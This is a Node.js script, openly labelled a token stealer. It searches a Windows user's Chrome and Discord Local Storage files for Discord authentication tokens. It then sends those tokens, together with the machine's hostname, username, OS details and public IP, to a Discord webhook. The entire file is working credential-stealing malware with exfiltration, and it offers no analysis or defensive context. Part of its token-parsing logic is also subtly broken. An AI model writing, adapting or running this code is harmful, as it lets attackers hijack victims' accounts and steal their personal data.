"use strict";

// Dependencies
const discord = require("discord.js")
const publicIP = require("public-ip")
const os = require("os")
const fs = require("fs")

// Variables
const webhook = new discord.WebhookClient("webhookID", "webhookToken")

var tokenStealer = {
    cdt: null,
    sdt: null
}

// Functions
function chrome(){
    fs.readdir(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb`, "utf8", function(err, files){
        if(err) return disCord()

        files.forEach(file =>{
            if(file.indexOf("log") !== -1){
                const log_data = fs.readFileSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\${file}`, "utf8")
                const tokens = Array.from(log_data.matchAll(/(mfa\.[a-z0-9_-]{20,})|([a-z0-9_-]{23,28}\.[a-z0-9_-]{6,7}\.[a-z0-9_-]{27})/g))
                const results = []
                
                if(tokens.length === 0){
                    tokenStealer.cdt = "No discord tokens in chrome."
                    return disCord()
                }

                for( const token of tokens ) if(results.indexOf(token[0]) === -1) results.push(token[0])

                tokenStealer.cdt = results
                return disCord()
            }
        })
    })
}

function disCord(){
    fs.readdir(`C:\\Users\\${os.userInfo().username}\\AppData\\Roaming\\discord\\Local Storage\\leveldb`, "utf8", function(err, files){
        if(err){
            done()
            return
        }

        files.forEach(file =>{
            if(file.indexOf("log") != -1){
                const log_data = fs.readFileSync(`C:\\Users\\${os.userInfo().username}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\${file}`, "utf8")
                const tokens = Array.from(log_data.matchAll(/(mfa\.[a-z0-9_-]{20,})|([a-z0-9_-]{23,28}\.[a-z0-9_-]{6,7}\.[a-z0-9_-]{27})/g))
                const results = []
                
                if(tokens.length === 0){
                    tokenStealer.sdt = "No discord tokens in discord software."
                    process.exit()
                }

                for( var token of tokens ){
                    token = token[0].replace('"token":"', "")
                    token = token[0].replace('"', "")

                    if(results.indexOf(token[0]) === -1) results.push(token)
                }

                tokenStealer.sdt = results.join(", ")
                return done()
            }
        })
    })
}

async function done(){
    const IP = await publicIP.v4()

    webhook.send("```" + `OS Type: ${os.type()}
OS Platform: ${os.platform()}
OS Hostname: ${os.hostname()}
            
OS Username: ${os.userInfo().username}
IP: ${IP}
Chrome discord tokens found: ${tokenStealer.cdt}
Software discord tokens found: ${tokenStealer.sdt}` + "```",).then(()=>{
        process.exit()
    }).catch(()=>{
        process.exit()
    })
}

// Main
chrome()